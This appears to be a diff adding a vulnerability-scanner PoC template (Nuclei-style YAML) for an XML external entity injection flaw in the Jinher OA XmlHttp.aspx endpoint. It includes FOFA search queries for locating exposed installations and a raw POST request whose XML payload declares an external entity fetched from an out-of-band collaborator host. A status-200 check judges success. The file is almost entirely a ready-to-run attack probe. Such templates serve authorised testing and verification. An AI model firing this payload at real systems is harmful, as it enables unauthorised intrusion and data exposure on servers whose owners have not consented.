@@ -1,0 +1,38 @@
+id: poc-lzsmty5a6d7h92bi
+info:
+  name: 金和OA XmlHttp.aspx 存在XML外部实体注入漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/lzsmty5a6d7h92bi'
+  tags: other,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: lzsmty5a6d7h92bi
+    fofa: title="金和协同管理平台" || body="js/PasswordCommon.js" || body="js/PasswordNew.js" || body="Jinher Network" || (body="c6/Jhsoft.Web.login" && body="CloseWindowNoAsk") || header="Path=/jc6" || (body="JC6金和协同管
+http:
+- raw:
+  - 'POST /c6/Jhsoft.Web.Accept/XmlHttp.aspx/ HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Content-Length: 179
+
+    Connection: close
+
+
+    <?xml version="1.0" encoding="UTF-8"?>
+
+    <!DOCTYPE root [
+
+    <!ENTITY % remote SYSTEM "http://abc123.yourcollab.net/xxe_test">
+
+    %remote;]>
+
+    <root/>'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
